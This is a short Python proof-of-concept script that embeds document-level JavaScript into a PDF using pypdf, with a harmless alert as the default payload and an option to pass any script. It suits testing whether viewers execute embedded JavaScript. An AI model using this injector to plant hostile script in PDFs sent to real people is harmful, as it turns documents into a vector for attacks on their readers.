#!/usr/bin/env python3
"""PDF JavaScript injection PoC.

Emits document-level JavaScript into a PDF via pypdf's PdfWriter.add_js().
The payload fires only in viewers that execute PDF JavaScript
(e.g. Adobe Acrobat/Reader); Chrome, Firefox and Preview ignore it.

Usage:
    python3 generate_poc.py                  # uses input.pdf
    python3 generate_poc.py --make-input     # generate a blank input.pdf first
"""

from __future__ import annotations

import argparse
from pathlib import Path

from pypdf import PdfReader, PdfWriter

JS_PAYLOAD = "app.alert('PDF JavaScript executed');"


def make_blank_input(path: Path) -> None:
    writer = PdfWriter()
    writer.add_blank_page(width=612, height=792)
    with path.open("wb") as fh:
        writer.write(fh)


def inject(src: Path, dst: Path, js: str = JS_PAYLOAD) -> None:
    reader = PdfReader(str(src))
    writer = PdfWriter()

    for page in reader.pages:
        writer.add_page(page)

    writer.add_js(js)

    with dst.open("wb") as fh:
        writer.write(fh)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--input", default="input.pdf", type=Path)
    parser.add_argument("--output", default="test-js.pdf", type=Path)
    parser.add_argument("--js", default=JS_PAYLOAD)
    parser.add_argument(
        "--make-input",
        action="store_true",
        help="create a blank input PDF if the source is missing",
    )
    args = parser.parse_args()

    if not args.input.exists():
        if not args.make_input:
            parser.error(f"{args.input} not found (pass --make-input to generate one)")
        make_blank_input(args.input)
        print(f"created {args.input}")

    inject(args.input, args.output, args.js)
    print(f"wrote {args.output}")


if __name__ == "__main__":
    main()
